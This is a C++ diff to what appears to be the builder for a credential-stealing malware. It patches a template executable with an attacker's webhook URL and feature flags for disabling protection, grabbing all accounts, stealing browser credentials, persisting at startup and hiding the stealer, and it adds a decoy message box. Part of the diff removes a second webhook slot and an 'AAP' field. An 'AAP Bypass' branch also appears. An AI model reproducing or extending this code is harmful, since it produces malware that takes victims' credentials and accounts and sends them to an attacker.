@@ -256,7 +256,7 @@ int main(int argc, char* argv[])
 			return 0;
 		}
 	}
-	if (CMDParts.size() == 6)
+	if (CMDParts.size() == 5)
 	{
 		if (true)
 		{
@@ -270,29 +270,22 @@ int main(int argc, char* argv[])
 			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
 				(istreambuf_iterator<char>()));
 			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
-			string DummyText2 = XorStr("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>");
 			size_t DummyTextLocation = AllBytes.find(DummyText);
-			size_t DummyText2Location = AllBytes.find(DummyText2);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
-			AllBytes.replace(DummyText2Location, WebHook.length(), WebHook);
 			string RawLocation = CMDParts[1];
-			string AAPData = CMDParts[2];
-			string DummyAAP = XorStr("{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}");
-			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
-			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
-			string Features = CMDParts[3];
+			string Features = CMDParts[2];
 			string DummyFeatures = XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]");
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
 			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
 
 			//Message Box
-			string MessageTitle = CMDParts[4];
+			string MessageTitle = CMDParts[3];
 			MessageTitle = MessageTitle.substr(1, MessageTitle.size() - 2);
 			string DummyTitle = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
 			size_t DummyTitleLocation = AllBytes.find(DummyTitle);
 			AllBytes.replace(DummyTitleLocation, MessageTitle.length(), MessageTitle);
-			string Message = CMDParts[5];
+			string Message = CMDParts[4];
 			Message = Message.substr(1, Message.size() - 2);
 			string DummyMessage = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
 			size_t DummyMessageLocation = AllBytes.find(DummyMessage);
@@ -312,7 +305,7 @@ int main(int argc, char* argv[])
 	else if (CMDParts.size() == 1)
 	{
 		//AAP Bypass
-		//MAC = [5EA1925815E4]
+		//MAC = [5EA1925815E4]==
 		string RawMAC = CMDParts[0];
 		RawMAC = RawMAC.substr(1, RawMAC.size() - 2);
 		RawMAC.erase(std::remove(RawMAC.begin(), RawMAC.end(), '-'), RawMAC.end());
